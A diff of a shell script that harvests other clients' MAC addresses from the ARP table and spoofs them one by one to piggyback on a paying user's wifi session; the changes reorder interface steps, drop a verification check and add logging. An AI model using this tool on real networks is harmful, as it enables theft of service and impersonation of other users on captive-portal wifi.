@@ -79,6 +79,8 @@ save_mac() {
   fi
 }
 
+
+
 usage() {
   echo "Usage: $0 [interface]"
   exit
@@ -92,25 +94,22 @@ elapsed_time() {
 
 check_mac() {
   mac_addr=$1
+
+  echo "[INFO] taking iface down ..."  
+  ifconfig $iface down  
+  sleep 1
+  echo "[INFO] changing mac to $mac_addr ..."
   if [ $os_name = "Darwin" ]; then  
     ifconfig $iface ether $mac_addr
   else
     ifconfig $iface hw ether $my_mac    
   fi
-
-  # validate if we are indeed able switch mac address; MacOS is flaky and sometimes doesn't actually work
-  new_mac=`ifconfig $iface|grep ether|awk '{print $2;}'`
-  if [ $new_mac != $mac_addr ] ; then
-    echo "[ERROR] unable to change '$new_mac' to new address '$mac_addr'" | /usr/bin/tee -a $log_file
-    exit 1
-  fi
+  sleep 2
 
   # take the interface down and up to ask for dhcp
-  echo "[INFO] taking iface down and up ..."
-  ifconfig $iface down
-  sleep 1
+  echo "[INFO] taking iface up ..."
   ifconfig $iface up
-  sleep 1
+  sleep 2
   /bin/echo -n "[INFO] waiting for new IP assignment ." | /usr/bin/tee -a $log_file 
   for (( i = 0; i<$ip_wait; i++ )) do
     sleep 1
@@ -147,6 +146,7 @@ search_free_wifi() {
   # authenticated mac (someone who paid for this crappy wifi)
   list_of_macs=`/usr/sbin/arp -an -i $iface|awk '{print $4;}'`
 
+  echo "[INFO] mac list to scan: $list_of_macs" >> $log_file
 
   # search through all the macs we collected
   for mac in $list_of_macs; do 
